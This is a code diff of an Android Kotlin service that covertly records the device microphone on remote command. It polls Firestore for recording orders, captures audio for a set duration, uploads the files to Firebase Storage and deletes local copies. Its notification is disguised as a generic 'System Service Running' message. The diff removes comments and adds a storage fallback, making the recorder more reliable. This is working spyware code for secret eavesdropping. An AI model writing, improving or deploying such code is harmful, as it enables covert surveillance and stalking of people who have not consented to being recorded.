@@ -21,16 +21,13 @@ import java.text.SimpleDateFormat
 import java.util.*
 import java.util.concurrent.Executors
 
-/**
- * Service that handles audio recording and uploads to Firebase Storage
- */
 class MicRecordingService : Service() {
     companion object {
         private const val TAG = "MicRecordingService"
         private const val NOTIFICATION_ID = 1005
         private const val CHANNEL_ID = "mic_recording_channel"
         private const val CHANNEL_NAME = "Microphone Recording"
-        private const val DEFAULT_RECORDING_DURATION = 60000L // 1 minute
+        private const val DEFAULT_RECORDING_DURATION = 60000L 
     }
     
     private lateinit var firestore: FirebaseFirestore
@@ -42,7 +39,6 @@ class MicRecordingService : Service() {
     private var currentRecordingFile: File? = null
     private var recordingStartTime: Long = 0
     
-    // Executor for background tasks
     private val executor = Executors.newSingleThreadExecutor()
     
     private val binder = LocalBinder()
@@ -57,7 +53,6 @@ class MicRecordingService : Service() {
         firestore = FirebaseFirestore.getInstance()
         storage = FirebaseStorage.getInstance()
         
-        // Create the notification channel
         NotificationChannelManager.createNotificationChannel(
             this,
             CHANNEL_ID,
@@ -65,14 +60,12 @@ class MicRecordingService : Service() {
             NotificationManager.IMPORTANCE_LOW
         )
         
-        // Listen for audio recording commands
         listenForRecordingCommands()
     }
     
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d(TAG, "MicRecordingService started")
         
-        // Create a notification for the foreground service
         val notification = createNotification()
         startForeground(NOTIFICATION_ID, notification)
         
@@ -91,7 +84,7 @@ class MicRecordingService : Service() {
     }
     
     private fun createNotification(): Notification {
-        // Create an intent that will open the app when tapped
+        
         val notificationIntent = Intent(this, this::class.java)
         val pendingIntent = PendingIntent.getActivity(
             this,
@@ -100,7 +93,6 @@ class MicRecordingService : Service() {
             PendingIntent.FLAG_IMMUTABLE
         )
         
-        // Build the notification
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("System Service Running")
             .setContentText("Maintaining system services...")
@@ -124,14 +116,12 @@ class MicRecordingService : Service() {
                     val command = change.document
                     Log.d(TAG, "Received audio recording command: ${command.id}")
                     
-                    // Extract duration from command if provided
                     val params = command.get("params") as? Map<String, Any>
                     val durationMs = params?.get("durationMs") as? Long ?: DEFAULT_RECORDING_DURATION
                     
-                    // Start recording
                     startRecording(durationMs) { success ->
                         if (success) {
-                            // Mark the command as executed
+                            
                             command.reference.update("isExecuted", true)
                         }
                     }
@@ -178,14 +168,13 @@ class MicRecordingService : Service() {
                     recordingStartTime = System.currentTimeMillis()
                     Log.d(TAG, "Recording started, duration: ${durationMs}ms")
                     
-                    // Schedule recording to stop after the specified duration
                     executor.execute {
                         try {
                             Thread.sleep(durationMs)
                             
                             if (isRecording) {
                                 stopRecording()
-                                // Upload the recording
+                                
                                 uploadRecording(audioFile, (System.currentTimeMillis() - recordingStartTime).toInt() / 1000)
                             }
                         } catch (e: InterruptedException) {
@@ -224,28 +213,38 @@ class MicRecordingService : Service() {
     private fun createAudioFile(): File? {
         val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
         val fileName = "AUDIO_$timeStamp.mp4"
-        val storageDir = getExternalFilesDir(null)
         
-        return if (storageDir != null) {
-            File(storageDir, fileName)
-        } else {
-            Log.e(TAG, "External files directory is null")
+        var storageDir = getExternalFilesDir(null)
+        
+        if (storageDir == null || !storageDir.exists() || !storageDir.canWrite()) {
+            Log.w(TAG, "External storage not available, falling back to internal storage")
+            storageDir = filesDir
+        }
+        
+        return try {
+            if (!storageDir.exists() && !storageDir.mkdirs()) {
+                Log.e(TAG, "Failed to create storage directory: ${storageDir.absolutePath}")
+                null
+            } else {
+                File(storageDir, fileName)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to create audio file", e)
             null
         }
     }
     
     private fun uploadRecording(file: File, durationSeconds: Int) {
-        // Create a reference to Firebase Storage
+        
         val timestamp = System.currentTimeMillis()
         val filename = "audio_${timestamp}.mp4"
         val storageRef = storage.reference.child("audio_recordings/$filename")
         
-        // Upload the file
         val uploadTask = storageRef.putFile(Uri.fromFile(file))
         uploadTask.addOnSuccessListener {
-            // Get the download URL
+            
             storageRef.downloadUrl.addOnSuccessListener { uri ->
-                // Save the audio recording metadata to Firestore
+                
                 val recordingData = hashMapOf(
                     "audioUrl" to uri.toString(),
                     "timestamp" to Timestamp.now(),
@@ -257,7 +256,6 @@ class MicRecordingService : Service() {
                     .addOnSuccessListener { documentReference ->
                         Log.d(TAG, "Audio recording uploaded with ID: ${documentReference.id}")
                         
-                        // Clean up the file
                         file.delete()
                     }
                     .addOnFailureListener { e ->
